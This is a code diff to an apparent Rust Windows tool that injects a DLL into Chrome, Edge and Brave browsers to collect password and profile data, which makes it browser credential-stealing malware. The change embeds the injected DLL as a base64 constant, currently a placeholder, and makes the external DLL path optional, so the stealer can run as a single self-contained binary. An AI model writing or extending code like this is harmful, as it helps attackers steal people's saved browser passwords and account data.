@@ -1,10 +1,11 @@
 pub mod bootstrapper;
 
+use base64::Engine;
 use clap::Parser;
 use serde::{Deserialize, Serialize};
 use std::ffi::{c_void, OsStr};
 use std::fs;
-use std::io::{Read, Write};
+use std::io::Write;
 use std::os::windows::ffi::OsStrExt;
 use std::path::Path;
 use std::ptr;
@@ -19,6 +20,8 @@ use windows_sys::Win32::System::Threading::*;
 use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE};
 
 use crate::bootstrapper::{realign_pe, realign_pe_end, DllInfo};
+
+const PROXY_DLL_BASE64: &str = "REPLACE_WITH_ACTUAL_BASE64_DLL_BYTES";
 
 #[derive(Serialize, Deserialize, Debug)]
 struct PasswordData {
@@ -59,9 +62,9 @@ struct ProfileData {
 #[derive(Parser, Debug)]
 #[command(author, version, about, long_about = None)]
 struct Args {
-    /// Path to the DLL to inject
+    /// Path to the DLL to inject (optional, if provided it overrides the embedded DLL)
     #[arg(short, long)]
-    dll: String,
+    dll: Option<String>,
 
     /// Target browser (chrome, edge, brave, all)
     #[arg(short, long, default_value = "all")]
@@ -426,8 +429,12 @@ fn inject_and_collect(dll_bytes: &[u8], browser_config: &BrowserConfig) {
 
 fn main() {
     let args = Args::parse();
-    let dll_path = std::path::Path::new(&args.dll).canonicalize().expect("DLL path error");
-    let dll_bytes = std::fs::read(&dll_path).expect("Failed to read DLL file");
+
+    let dll_bytes = if let Some(path) = args.dll {
+        std::fs::read(&path).expect("Failed to read DLL file")
+    } else {
+        base64::engine::general_purpose::STANDARD.decode(PROXY_DLL_BASE64).expect("Failed to decode embedded DLL")
+    };
 
     if args.browser.to_lowercase() == "all" {
         for config in BROWSERS {
